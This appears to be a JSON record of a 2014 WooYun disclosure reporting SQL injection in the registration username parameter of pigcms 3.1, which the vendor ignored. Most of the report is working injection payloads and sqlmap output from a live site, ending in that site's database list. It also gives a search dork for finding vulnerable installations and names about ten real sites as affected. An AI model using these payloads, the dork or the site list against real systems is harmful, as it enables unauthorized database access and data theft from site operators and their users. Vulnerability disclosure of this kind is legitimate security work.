{"id": 42566, "wybug_id": "wooyun-2014-085324", "wybug_title": "pigcms3.1 另一处注入", "wybug_corp": "小猪CMS", "wybug_author": "宇少", "wybug_date": "2014-12-05 15:27", "wybug_open_date": "2015-03-05 15:28", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["字符类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-05：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-03-05：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： pigcms3.1 用户注册处注入漏洞 详细说明：  \n WooYun: 某通用型微信公众平台SQL注入（泄露上万商家信息） \n关键词：inurl:index.php?g=Home&m=Index&a=help\n相关案例：http://www.fifee.com/http://lierk.cn/index.php?m=Index&a=login+http://a.t2.weixinbiz.cn/index.php?m=Index&a=reghttp://114.215.185.138/index.php?m=Users&a=checkloginhttp://wechat.lx1999.com.cn/index.php?m=Users&a=checkloginhttp://www.jpsbzr.com/index.php?m=Index&a=loginhttp://www.iweichat.com/index.php?m=Index&a=loginhttp://166u.cn/http://wx.lefangw.cn/index.php?g=Home&m=Index&a=help\n   漏洞证明：  #1演示站点：用户注册\nhttp://wechat.lx1999.com.cn/index.php?m=Index&a=login\n然后抓包，username参数为过滤，可以注入，单引号已经带入进去咯\n\n这里直接丢进sqlmap里面跑吧~\n---Place: POSTParameter: username    Type: boolean-based blind    Title: MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)    Payload: username=synack') RLIKE (SELECT (CASE WHEN (8978=8978) THEN 0x73796e61636b ELSE 0x28 END)) AND ('IRPc'='IRPc&password=synack&repassword=synack&mp=13585001213&email=15515002@qq.com&invitecode=&__hash__=3e9fde7441cc55bf46afe7f8361af205_55b6754b5cf7bfbacb68f0eda1ff0b9a    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: username=synack') AND (SELECT 6837 FROM(SELECT COUNT(*),CONCAT(0x716f796471,(SELECT (CASE WHEN (6837=6837) THEN 1 ELSE 0 END)),0x7165736d71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND ('BXpm'='BXpm&password=synack&repassword=synack&mp=13585001213&email=15515002@qq.com&invitecode=&__hash__=3e9fde7441cc55bf46afe7f8361af205_55b6754b5cf7bfbacb68f0eda1ff0b9a    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: username=synack') AND SLEEP(5) AND ('CIZJ'='CIZJ&password=synack&repassword=synack&mp=13585001213&email=15515002@qq.com&invitecode=&__hash__=3e9fde7441cc55bf46afe7f8361af205_55b6754b5cf7bfbacb68f0eda1ff0b9a---web application technology: Apacheback-end DBMS: MySQL 5.0sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: username    Type: boolean-based blind    Title: MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)    Payload: username=synack') RLIKE (SELECT (CASE WHEN (8978=8978) THEN 0x73796e61636b ELSE 0x28 END)) AND ('IRPc'='IRPc&password=synack&repassword=synack&mp=13585001213&email=15515002@qq.com&invitecode=&__hash__=3e9fde7441cc55bf46afe7f8361af205_55b6754b5cf7bfbacb68f0eda1ff0b9a    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: username=synack') AND (SELECT 6837 FROM(SELECT COUNT(*),CONCAT(0x716f796471,(SELECT (CASE WHEN (6837=6837) THEN 1 ELSE 0 END)),0x7165736d71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND ('BXpm'='BXpm&password=synack&repassword=synack&mp=13585001213&email=15515002@qq.com&invitecode=&__hash__=3e9fde7441cc55bf46afe7f8361af205_55b6754b5cf7bfbacb68f0eda1ff0b9a    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: username=synack') AND SLEEP(5) AND ('CIZJ'='CIZJ&password=synack&repassword=synack&mp=13585001213&email=15515002@qq.com&invitecode=&__hash__=3e9fde7441cc55bf46afe7f8361af205_55b6754b5cf7bfbacb68f0eda1ff0b9a---web application technology: Apacheback-end DBMS: MySQL 5.0available databases [5]:[*] information_schema[*] mysql[*] start[*] weixine[*] weixintest\n   修复方案：  过滤一下username   版权声明：转载请注明来源 宇少@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2014-12-05 15:49 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  宇哥来了@07@jyhack.com @zhxs    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}